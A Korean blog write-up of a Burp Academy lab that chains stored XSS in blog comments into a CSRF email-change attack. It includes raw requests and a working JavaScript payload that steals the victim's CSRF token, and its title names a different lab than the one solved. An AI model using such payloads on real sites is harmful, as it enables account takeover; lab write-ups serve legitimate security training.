---
layout: post
title: "Burp Academy-XSS 취약점: Exploiting cross-site scripting to capture passwords"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, XSS취약점]
toc: true
last_modified_at: 2024-09-02 21:55:00 +0900
---

# 개요
- XSS를 이용하여 CSRF 공격을 하는 문제이다. 
- 취약점 설명 주소: https://portswigger.net/web-security/cross-site-scripting/exploiting
- 문제 주소: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf
- 난이도: PRACTITIONER (보통)

# 취약점 설명
합법적인 사용자가 웹사이트에서 할 수 있는 모든 일은 아마도 XSS로도 할 수 있을 것이다. 타겟으로 삼는 사이트에 따라 피해자에게 메시지를 보내거나, 친구 요청을 수락시키거나, 소스 코드 저장소에 백도어를 커밋하거나, 비트코인을 일부 전송할 수 있다. 

**일부 웹사이트에서는 로그인한 사용자가 비밀번호를 다시 입력하지 않고도 이메일 주소를 변경할 수 있다.** 이 사이트에서 XSS 취약점을 발견했다면 이 기능을 트리거하여 피해자의 이메일 주소를 공격자가 제어하는 ​​이메일 주소로 변경한 다음 비밀번호 재설정을 트리거하여 계정에 액세스할 수 있다. 

이러한 유형의 익스플로잇은 일반적으로 크로스 사이트 요청 위조(CSRF)라고 하며, CSRF가 단독 취약점으로 발생할 수도 있기 때문에 약간 혼란스럽다. CSRF가 단독 취약점으로 발생하는 경우 안티-CSRF 토큰과 같은 전략을 사용하여 패치할 수 있다. 그러나 이러한 전략은 XSS 취약점도 있는 경우 어떠한 보호도 제공하지 않는다. 

# 문제
- 이 랩에는 블로그 댓글 기능에 저장형 XSS 취약점이 있다. 
- 랩을 풀려면 취약점을 악용하여 CSRF 공격을 수행하여 블로그 게시물 댓글을 보는 사람의 이메일 주소를 변경한다. 
- 다음 크레덴셜을 사용하여 자신의 계정에 로그인할 수 있다: wiener:peter

```
This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.

You can log in to your own account using the following credentials: wiener:peter
```

# 풀이 
1. 주어진 크레덴셜로 로그인해서 메일주소 변경요청을 해본다. 일단 로그인한 뒤에 자신의 계정관리로 들어간다. 

```http
GET /my-account?id=wiener HTTP/2
Host: 0a6e00cd0499972583dc288000b40034.web-security-academy.net
Cookie: session=QZnAt4S7KgLS8YzQ4HmZQWlAEmn2seGn
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0a6e00cd0499972583dc288000b40034.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7
Priority: u=0, i


```

응답에는 다음 코드가 포함되어 있다. 이를 통해 내 계정 관리 엔드포인트(GET /my-account)의 응답에 CSRF토큰이 포함되어 있는 것을 알았다. 

```http

<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="">
    <input required type="hidden" name="csrf" value="iCLEz7kBobXVoC2bYEMYjUrQJpwUK220">
    <button class='button' type='submit'> Update email </button>
```


2. 이메일을 변경해본다. 패스워드 재요청단계는 없다. 이를 통해 세션쿠키와 CSRF토큰이 있으면 이메일 주소를 변경할 수 있다는 것을 알았다. 

※ 참고로 세션토큰은 Secure속성과 HttpOnly 속성이 부여되어 있다. XSS를 사용해서 자바스크립트를 통해 세션토큰에 직접 접근하는 것은 할 수 없다. 

```http
POST /my-account/change-email HTTP/2
Host: 0a6e00cd0499972583dc288000b40034.web-security-academy.net
Cookie: session=QZnAt4S7KgLS8YzQ4HmZQWlAEmn2seGn
Content-Length: 57
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a6e00cd0499972583dc288000b40034.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6e00cd0499972583dc288000b40034.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7
Priority: u=0, i

email=ee%40test.com&csrf=iCLEz7kBobXVoC2bYEMYjUrQJpwUK220
```

3. XSS가 있는 곳을 확인한다. 댓글을 등록하는 요청의 comment 파라메터를 테스트해본다. 

```http
POST /post/comment HTTP/2
Host: 0a6e00cd0499972583dc288000b40034.web-security-academy.net
Cookie: session=NwxRcG7GwxSgOTkh0VZClBAhVC3XhOS9
Content-Length: 124
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a6e00cd0499972583dc288000b40034.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6e00cd0499972583dc288000b40034.web-security-academy.net/post?postId=3
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7
Priority: u=0, i

csrf=ylvidDriJQ2GCzSFP12ndfNn88yAEcPj&postId=3&comment=<script>alert(1);</script>&name=moon&email=moon%40tester.com&website=
```

302응답이 돌아온다. 블로그 글 페이지를 확인해보면 `alert(1);` 이 실행되는 것을 확인할 수 있다.  Stored XSS 취약점이 있는 것을 확인했다. 

```
HTTP/2 302 Found
Location: /post/comment/confirmation?postId=3
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```

![](/images/burp-academy-xss-16-1.png)

4. 이메일 주소 수정 기능과 XSS가 있는 곳을 확인했다. 그러면 CSRF를 수행하는 XSS페이로드를 만들어보자. 블로그 글을 보는 로그인한 유저가 자신의 이메일 주소를 공격자가 지정한 이메일 주소로 변경하도록 만든다.

다음과 같이 만든다. 이 코드가 실행되면, victim은 자신의 my-account 엔드포인트에서 CSRF토큰을 얻어온 후, test@test.com으로 메일 주소를 변경하는 요청을 보내게 된다. 

```js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

5. 위의 페이로드가 실행되도록 저장한다. 

![](/images/burp-academy-xss-16-2.png)


6. 그러면 잠시 뒤 문제가 풀렸다는 메세지가 출력된다. 


![](/images/burp-academy-xss-16-success.png)
